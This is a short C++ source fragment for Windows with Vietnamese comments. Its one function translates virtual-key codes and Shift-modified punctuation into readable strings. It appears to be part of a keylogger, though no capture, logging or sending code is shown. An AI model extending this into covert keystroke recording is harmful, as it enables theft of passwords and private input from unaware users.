#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

bool SpecialKeys(int &S_Key, std::string &output) {
    // Kiểm tra Shift đang được GIỮ (0x8000)
    bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;

    switch (S_Key) {
    case VK_SPACE:    output = "[SPACE]";  return true;
    case VK_RETURN:   output = "[ENTER]"; return true;
    case VK_BACK:     output = "[BACKSPACE]"; return true; // Xóa ký tự trên Console
    case VK_TAB:      output = "[TAB]"; return true;
    
    // Các phím điều hướng
    case VK_UP:       output = "[UP]";    return true;
    case VK_DOWN:     output = "[DOWN]";  return true;
    case VK_LEFT:     output = "[LEFT]";  return true;
    case VK_RIGHT:    output = "[RIGHT]"; return true;

    // --- CÁC PHÍM OEM (Xử lý cả Shift) ---
    case VK_OEM_3:      output = (shift ? "~" : "`");  return true;
    case VK_OEM_MINUS:  output = (shift ? "_" : "-");  return true;
    case VK_OEM_PLUS:   output = (shift ? "+" : "=");  return true;
    case VK_OEM_4:      output = (shift ? "{" : "[");  return true;
    case VK_OEM_6:      output = (shift ? "}" : "]");  return true;
    case VK_OEM_5:      output = (shift ? "|" : "\\"); return true;
    case VK_OEM_1:      output = (shift ? ":" : ";");  return true;
    case VK_OEM_7:      output = (shift ? "\"" : "'"); return true;
    case VK_OEM_COMMA:  output = (shift ? "<" : ",");  return true;
    case VK_OEM_PERIOD: output = (shift ? ">" : ".");  return true;
    case VK_OEM_2:      output = (shift ? "?" : "/");  return true;
    // Chặn in mã số của các phím chức năng
    case VK_SHIFT:   
		output = "[SHIFT]"; return true;
    case VK_CONTROL: 
		output = "[CTRL]";  return true;
    case VK_MENU:
		output = "[ALT]";   return true;
    case VK_CAPITAL:
		output = "[CAPS]";
        return true; 
    default:
        return false;
    }
}